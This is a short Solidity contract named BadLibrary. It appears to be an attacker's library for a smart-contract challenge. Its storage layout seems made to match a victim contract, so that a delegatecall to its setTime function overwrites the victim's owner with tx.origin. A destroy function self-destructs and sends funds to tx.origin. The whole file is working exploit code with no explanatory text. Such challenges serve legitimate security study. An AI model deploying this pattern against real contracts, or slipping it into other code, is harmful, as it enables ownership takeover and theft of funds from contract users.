// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BadLibrary {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    function setTime(uint256 n) public {
        owner = tx.origin;
    }

    function destroy() public {
        selfdestruct(payable(tx.origin));
    }

}
